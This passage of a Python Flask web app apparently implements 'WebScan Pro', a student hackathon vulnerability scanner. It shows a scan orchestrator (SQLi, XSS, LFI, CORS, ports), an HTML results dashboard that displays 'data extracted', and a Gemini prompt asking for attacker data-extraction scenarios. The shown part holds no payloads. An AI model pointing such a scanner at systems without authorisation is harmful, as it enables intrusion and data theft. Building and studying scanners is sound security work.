If open ports found, explain how attacker could extract data through them.

## PRIORITY FIX ORDER
Numbered list, most critical first.

## HACKATHON TIP
How to demo these findings at IIT Kanpur hackathon in 5 minutes.

Be technical and concise. Use markdown."""
    result=call_gemini(job.gemini_key,prompt,job)
    if result:
        job.ai_analysis=result
        job.log("Gemini AI analysis complete!","OK")


def run_scan(job):
    try:
        job.log(f"Target: {job.url}","INFO")
        run_ports(job)
        job.mod("Crawling for Parameters",2)
        crawled=crawl(job.url,job)
        if urlparse(job.url).query and job.url not in crawled:
            crawled.insert(0,job.url)
        urls=crawled if crawled else[job.url]
        run_recon(job)
        run_headers(job)
        run_ssl(job)
        run_files(job)
        run_sqli(urls,job)
        run_xss(urls,job)
        run_cors_methods(job)
        run_lfi_csrf(urls,job)
        run_misc(job)
        run_gemini(job)
    except Exception as e:
        job.log(f"Scanner error: {e}","WARN")
    finally:
        job.done()
        cnt=len(job.vulns)
        job.log(f"SCAN COMPLETE - {cnt} vulnerabilit{'y' if cnt==1 else 'ies'} found in {job.elapsed}s","OK")


HOME_HTML=r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WebScan Pro v3.0</title>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',system-ui,monospace;background:#0a0e17;color:#cdd9e5;min-height:100vh}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:#161b22}::-webkit-scrollbar-thumb{background:#30363d;border-radius:3px}
.hdr{background:linear-gradient(135deg,#161b22,#0a0e17);border-bottom:1px solid #21262d;padding:14px 28px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.hdr h1{font-size:1.15rem;color:#58a6ff;font-weight:700}.badge{padding:2px 9px;border-radius:20px;font-size:.68rem;font-weight:600}
.bv{background:#388bfd18;border:1px solid #388bfd40;color:#58a6ff}.bp{background:#3fb95018;border:1px solid #3fb95040;color:#3fb950}
.wrap{max-width:940px;margin:0 auto;padding:20px 14px}
.card{background:#161b22;border:1px solid #21262d;border-radius:12px;padding:22px;margin-bottom:16px}
.card h2{color:#f0f6fc;font-size:.95rem;margin-bottom:4px}.card p{color:#8b949e;font-size:.8rem;margin-bottom:16px}
.irow{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px}@media(max-width:560px){.irow{grid-template-columns:1fr}}
label{display:block;color:#8b949e;font-size:.73rem;margin-bottom:4px}
input[type=text]{width:100%;background:#0a0e17;border:1px solid #30363d;border-radius:8px;padding:9px 12px;color:#e6edf3;font-size:.88rem;outline:none;transition:border-color .2s}
input[type=text]:focus{border-color:#58a6ff}
.btn{background:linear-gradient(135deg,#1a7f37,#2ea043);border:none;color:#fff;padding:11px 22px;border-radius:8px;cursor:pointer;font-size:.88rem;font-weight:600;width:100%;transition:opacity .2s;margin-top:4px}
.btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
.qt a{color:#58a6ff;font-size:.76rem;display:inline-block;margin:3px 5px 3px 0;text-decoration:none}.qt a:hover{text-decoration:underline}
.wbox{background:#f8514910;border:1px solid #f8514940;border-radius:8px;padding:9px 14px;margin-bottom:14px;color:#d29922;font-size:.79rem}
#pa{display:none;margin-bottom:16px}
.pc{background:#161b22;border:1px solid #21262d;border-radius:12px;padding:16px 20px}
.ph{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.pl{color:#f0f6fc;font-size:.88rem;font-weight:600}.pp{color:#58a6ff;font-size:.95rem;font-weight:700}
.pt{background:#21262d;border-radius:99px;height:7px;overflow:hidden}
.pb{background:linear-gradient(90deg,#1a7f37,#58a6ff);height:100%;border-radius:99px;transition:width .5s ease;width:0%}
.pm{color:#8b949e;font-size:.76rem;margin-top:7px}.pe{color:#8b949e;font-size:.74rem;margin-top:2px}
.term{background:#010409;border:1px solid #21262d;border-radius:10px;padding:12px 14px;height:260px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.73rem;margin-bottom:16px;scroll-behavior:smooth}
.ll{padding:1px 0;display:flex;gap:7px;line-height:1.4}.lt{color:#30363d;flex-shrink:0}
.INFO{color:#8b949e}.OK{color:#3fb950}.VULN{color:#f85149;font-weight:700}.WARN{color:#d29922}.SKIP{color:#444c56}.HEAD{color:#58a6ff;font-weight:700}
#sr{display:none;grid-template-columns:repeat(4,1fr);gap:9px;margin-bottom:16px}
.sc{background:#161b22;border-radius:10px;padding:12px 14px;text-align:center;border:1px solid #21262d}
.sn{font-size:1.5rem;font-weight:700;margin-bottom:1px}.sl{font-size:.7rem;color:#8b949e;font-weight:600}
.C .sn{color:#f85149}.H .sn{color:#d29922}.M .sn{color:#58a6ff}.L .sn{color:#3fb950}
#ps{display:none}.portsc{background:#161b22;border:1px solid #21262d;border-radius:12px;padding:16px 20px;margin-bottom:14px}
.portsc h3{color:#58a6ff;font-size:.88rem;margin-bottom:10px}
.pg{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:7px}
.pch{background:#0a0e17;border-radius:7px;padding:7px 11px;border:1px solid #21262d}.pch.d{border-color:#f8514940}
.pn{color:#f0f6fc;font-weight:700;font-size:.88rem}.ps2{color:#8b949e;font-size:.72rem}
#ra{display:none}
.rh{background:#161b22;border:1px solid #21262d;border-radius:12px;padding:16px 20px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center}
.rc{font-size:1.1rem;font-weight:700;color:#f0f6fc}.rt{color:#8b949e;font-size:.76rem;margin-top:2px}
.rb{padding:4px 13px;border-radius:20px;font-size:.8rem;font-weight:700}
.rC{background:#f8514920;color:#f85149;border:1px solid #f8514960}
.rH{background:#d2992218;color:#d29922;border:1px solid #d2992260}
.rM{background:#388bfd15;color:#58a6ff;border:1px solid #388bfd50}
.rL{background:#3fb95018;color:#3fb950;border:1px solid #3fb95060}
.vl{display:grid;gap:9px;margin-bottom:16px}
.vc{background:#161b22;border-radius:10px;padding:12px 15px;border:1px solid #21262d;border-left:3px solid #f85149}
.vc.sC{border-left-color:#f85149}.vc.sH{border-left-color:#d29922}.vc.sM{border-left-color:#58a6ff}.vc.sL{border-left-color:#3fb950}
.vh{display:flex;align-items:center;gap:7px;margin-bottom:5px}
.vs{padding:2px 7px;border-radius:5px;font-size:.67rem;font-weight:700}
.vt{color:#f0f6fc;font-size:.86rem;font-weight:600}.vd{color:#8b949e;font-size:.76rem;font-family:monospace;margin-bottom:5px}
.vex{background:#0a0e17;border-radius:6px;padding:7px 10px;color:#3fb950;font-size:.72rem;font-family:monospace;margin-bottom:5px;border:1px solid #30363d}
.ftb{background:none;border:none;color:#58a6ff;font-size:.72rem;cursor:pointer;padding:0}
.fd{display:none;background:#0a0e17;border-radius:6px;padding:7px 10px;margin-top:5px;color:#79c0ff;font-size:.72rem;font-family:monospace;border:1px solid #21262d}
.nv{text-align:center;padding:24px;background:#161b22;border:1px solid #21262d;border-radius:12px;color:#3fb950;font-size:.88rem}
.aic{background:#161b22;border:1px solid #388bfd30;border-radius:12px;padding:18px;margin-bottom:14px}
.aic h3{color:#58a6ff;margin-bottom:12px;font-size:.92rem}
.aib{color:#cdd9e5;font-size:.8rem;line-height:1.75}
.aib h2{color:#58a6ff;font-size:.9rem;margin:12px 0 5px}.aib h3{color:#79c0ff;font-size:.83rem;margin:9px 0 4px}
.aib code{background:#0a0e17;padding:1px 5px;border-radius:4px;color:#79c0ff;font-size:.76rem}
.aib pre{background:#0a0e17;border:1px solid #21262d;border-radius:7px;padding:10px;overflow-x:auto;margin:7px 0}
.aib ul,.aib ol{margin-left:16px;margin-bottom:5px}.aib li{margin-bottom:2px}.aib p{margin-bottom:7px}.aib strong{color:#f0f6fc}
.bna{background:#21262d;border:1px solid #30363d;color:#cdd9e5;padding:8px 18px;border-radius:8px;cursor:pointer;font-size:.82rem;text-decoration:none;display:inline-block;margin-top:8px}
.dlb{background:#0a0e17;border:1px solid #30363d;color:#58a6ff;padding:6px 14px;border-radius:8px;cursor:pointer;font-size:.76rem;float:right;text-decoration:none}
</style></head><body>
<div class="hdr">
  <svg width="20" height="20" viewBox="0 0 24 24" fill="#58a6ff"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
  <h1>WebScan Pro</h1><span class="badge bv">v3.0</span><span class="badge bp">IIT Kanpur Portfolio</span>
</div>
<div class="wrap">
  <div class="wbox">Only scan websites you <strong>own</strong> or have <strong>explicit permission</strong> to test. Unauthorized scanning = IT Act 2000, Section 66.</div>
  <div id="fa">
    <div class="card">
      <h2>Launch Full Security Scan</h2>
      <p>Auto-crawls the site, finds parameterized URLs, scans open ports with service exploits, tests 50+ vulnerability types, and uses Gemini AI for attack scenarios + fix guide.</p>
      <div class="irow">
        <div><label>Target URL</label><input type="text" id="iu" value="http://testphp.vulnweb.com/" placeholder="https://example.com"></div>
        <div><label>Gemini API Key (optional — AI analysis)</label><input type="text" id="ik" placeholder="AIzaSy... (free: aistudio.google.com)"></div>
      </div>
      <button class="btn" id="sb" onclick="go()">🚀 Start Full Scan</button>
      <div class="qt" style="margin-top:10px">
        <span style="color:#8b949e;font-size:.73rem">Quick select: </span>
        <a href="#" onclick="su('http://testphp.vulnweb.com/')">testphp.vulnweb.com</a>
        <a href="#" onclick="su('http://demo.testfire.net/')">demo.testfire.net</a>
        <a href="#" onclick="su('http://testphp.vulnweb.com/listproducts.php?cat=1')">SQLi test page</a>
        <a href="#" onclick="su('http://testphp.vulnweb.com/artists.php?artist=1')">artists.php</a>
      </div>
    </div>
  </div>
  <div id="pa">
    <div class="pc">
      <div class="ph"><span class="pl" id="pl">Initializing...</span><span class="pp" id="pp">0%</span></div>
      <div class="pt"><div class="pb" id="pb"></div></div>
      <div class="pm" id="pm">Starting scan...</div><div class="pe" id="pe">0s elapsed</div>
    </div>
    <div class="term" id="term"></div>
  </div>
  <div id="sr" style="display:none">
    <div class="sc C"><div class="sn" id="sC">0</div><div class="sl">CRITICAL</div></div>
    <div class="sc H"><div class="sn" id="sH">0</div><div class="sl">HIGH</div></div>
    <div class="sc M"><div class="sn" id="sM">0</div><div class="sl">MEDIUM</div></div>
    <div class="sc L"><div class="sn" id="sL">0</div><div class="sl">LOW</div></div>
  </div>
  <div id="ps"><div class="portsc"><h3>Open Ports</h3><div class="pg" id="pg"></div></div></div>
  <div id="ra">
    <div class="rh">
      <div><div class="rc" id="rc">Scanning...</div><div class="rt" id="rt2"></div><div class="rt" id="rtm"></div></div>
      <div class="rb rL" id="rb">—</div>
    </div>
    <div class="vl" id="vl"></div>
    <div class="aic" id="aic" style="display:none"><h3>🤖 Gemini AI Security Report</h3><div class="aib" id="aib"></div></div>
    <a href="/" class="bna">← Scan Another URL</a>
    <a href="#" class="dlb" id="dl">⬇ Download Report</a>
  </div>
</div>
<script>
let sid=null,poller=null,li=0,etimer=null,es=0;
const SC={CRITICAL:'#f85149',HIGH:'#d29922',MEDIUM:'#58a6ff',LOW:'#3fb950'};
const SB={CRITICAL:'#f8514920',HIGH:'#d2992218',MEDIUM:'#388bfd15',LOW:'#3fb95018'};
const SK={CRITICAL:'sC',HIGH:'sH',MEDIUM:'sM',LOW:'sL'};
const RK={CRITICAL:'rC',HIGH:'rH',MEDIUM:'rM',LOW:'rL'};
function su(u){document.getElementById('iu').value=u;return false}
async function go(){
  const url=document.getElementById('iu').value.trim();
  const key=document.getElementById('ik').value.trim();
  if(!url){alert('Enter a target URL');return}
  document.getElementById('sb').disabled=true;
  document.getElementById('sb').textContent='Scanning...';
  document.getElementById('fa').style.display='none';
  document.getElementById('pa').style.display='block';
  document.getElementById('term').innerHTML='';
  li=0;es=0;
  etimer=setInterval(()=>{es++;document.getElementById('pe').textContent=es+'s elapsed'},1000);
  const fd=new FormData();fd.append('url',url);fd.append('gemini_key',key);
  const r=await fetch('/scan',{method:'POST',body:fd});
  const d=await r.json();sid=d.scan_id;
  document.getElementById('rt2').textContent=url;
  poller=setInterval(tick,2000);tick();
}
async function tick(){
  if(!sid)return;
  try{
    const r=await fetch('/api/status/'+sid);const d=await r.json();
    upTerm(d.logs||[]);
    document.getElementById('pb').style.width=(d.progress||0)+'%';
    document.getElementById('pp').textContent=(d.progress||0)+'%';
    document.getElementById('pl').textContent=d.current_mod||'Running...';
    document.getElementById('pm').textContent='Module: '+(d.current_mod||'...');
    if(d.status==='done'){clearInterval(poller);clearInterval(etimer);upTerm(d.logs||[]);showRes(d);}
  }catch(e){console.error(e)}
}
function upTerm(logs){
  const t=document.getElementById('term');
  logs.slice(li).forEach(l=>{
    const d=document.createElement('div');d.className='ll';
    d.innerHTML='<span class="lt">['+l.time+']</span><span class="'+l.level+'">'+esc(l.msg)+'</span>';
    t.appendChild(d);li++;
  });t.scrollTop=t.scrollHeight;
}
function showRes(d){
  const vs=d.vulns||[];const cnt=vs.length;
  const counts={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
  vs.forEach(v=>{counts[v.severity]=(counts[v.severity]||0)+1});
  ['CRITICAL','HIGH','MEDIUM','LOW'].forEach(s=>document.getElementById('s'+s[0]).textContent=counts[s]);
  document.getElementById('sr').style.display='grid';
  const ports=((d.results||{}).ports||{}).open||[];
  if(ports.length>0){
    document.getElementById('ps').style.display='block';
    const pg=document.getElementById('pg');pg.innerHTML='';
    ports.forEach(p=>{
      const isDanger=['Telnet','Redis','Elasticsearch','MongoDB','Jupyter','Memcached'].includes(p.service);
      const c=document.createElement('div');c.className='pch'+(isDanger?' d':'');
      c.innerHTML='<div class="pn">'+p.port+' <span class="ps2">'+p.service+'</span></div>'+(p.banner?'<div class="ps2">'+esc(p.banner.substring(0,40))+'</div>':'');
      pg.appendChild(c);
    });
  }
  let risk='LOW';
  if(counts.CRITICAL>0)risk='CRITICAL';else if(counts.HIGH>0)risk='HIGH';else if(counts.MEDIUM>0)risk='MEDIUM';
  document.getElementById('ra').style.display='block';
  document.getElementById('rc').textContent=cnt===0?'No vulnerabilities found':`${cnt} Vulnerabilit${cnt===1?'y':'ies'} Found`;
  document.getElementById('rtm').textContent='Completed in '+d.elapsed+'s';
  const rb=document.getElementById('rb');rb.textContent=risk;rb.className='rb '+RK[risk];
  const ord={CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3};
  vs.sort((a,b)=>(ord[a.severity]||4)-(ord[b.severity]||4));
  const vl=document.getElementById('vl');vl.innerHTML='';
  if(cnt===0){
    vl.innerHTML='<div class="nv">No vulnerabilities detected — site appears secure!</div>';
  }else{
    vs.forEach((v,i)=>{
      const s=v.severity||'MEDIUM';const fi='f'+i;
      const c=document.createElement('div');c.className='vc '+SK[s];
      c.innerHTML='<div class="vh"><span class="vs" style="background:'+SB[s]+';color:'+SC[s]+'">'+s+'</span><span class="vt">'+esc(v.type)+'</span></div>'+
        '<div class="vd">'+esc(v.detail)+'</div>'+
        (v.extracted_data?'<div class="vex">DATA EXTRACTED: '+esc(String(v.extracted_data).substring(0,200))+'</div>':'')+
        '<button class="ftb" onclick="tf(\''+fi+'\')">▸ How to Fix</button>'+
        '<div class="fd" id="'+fi+'">'+esc(v.fix||'')+'</div>';
      vl.appendChild(c);
    });
  }
  if(d.ai_analysis){document.getElementById('aic').style.display='block';document.getElementById('aib').innerHTML=marked.parse(d.ai_analysis);}
  document.getElementById('dl').onclick=()=>{
    const b=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
    const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='scan_'+sid+'.json';a.click();return false;
  };
}
function tf(id){const e=document.getElementById(id);e.style.display=e.style.display==='block'?'none':'block';}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
</script></body></html>"""


@app.route("/")
def home(): return HOME_HTML

@app.route("/scan",methods=["POST"])
def start_scan():
    url=request.form.get("url","").strip()
    key=request.form.get("gemini_key","").strip()
    if not url: return jsonify({"error":"URL required"}),400
    if not url.startswith(("http://","https://")): url="https://"+url
    job=ScanJob(url.rstrip("/"),key)
    scans[job.id]=job
    threading.Thread(target=run_scan,args=(job,),daemon=True).start()
    return jsonify({"scan_id":job.id})

@app.route("/api/status/<scan_id>")
def status(scan_id):
    job=scans.get(scan_id)
    if not job: return jsonify({"error":"Not found"}),404
    return jsonify({
        "status":job.status,"logs":job.logs,"vulns":job.vulns,
        "results":job.results,"ai_analysis":job.ai_analysis,
        "progress":job.progress,"current_mod":job.current_mod,
        "elapsed":round(time.time()-job.start,1) if job.status=="running" else job.elapsed,
    })

@app.route("/health")
def health(): return jsonify({"status":"ok"})

if __name__=="__main__":
    print(f"[*] WebScan Pro v3.0 on port {PORT}")
    print(f"[*] http://localhost:{PORT}")
    app.run(host="0.0.0.0",port=PORT,debug=False,threaded=True)

